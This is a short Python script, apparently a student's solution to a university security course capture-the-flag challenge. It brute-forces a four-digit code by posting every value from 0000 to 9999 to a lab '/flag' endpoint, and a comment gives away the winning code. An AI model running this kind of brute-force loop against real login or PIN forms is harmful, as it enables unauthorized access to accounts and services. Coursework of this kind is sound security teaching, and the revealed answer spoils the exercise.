#!/usr/bin/env python

import re
import requests
import time


class colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    RESET = '\033[0m'


s = requests.Session()
s.cert = "/home/archer/uni/COMP6843/z3291100.pem"
flag_pattern = re.compile(r"COMP6443\{.+?\}")
url = "https://quoccaair-ff.quoccacorp.com/flag"
found = False

with open('result.txt', 'a') as result_file:
    for num in range(10000):  # flag is at 8509
        time.sleep(0.1)
        code = f"{num:04}"
        payload = {'code': code}
        r = s.post(url, data=payload)
        match = flag_pattern.search(r.text)
        print(f"{colors.GREEN}[+] Code: {colors.RESET}{code}")

        if match:
            flag = match.group(0)
            print(f"{colors.PURPLE}[+] Flag: {colors.RESET}{flag}")
            found = True
            result_file.write(flag + '\n')
            break

    if not found:
        print(f"{colors.RED}[!] Flag not found!{colors.RESET}")
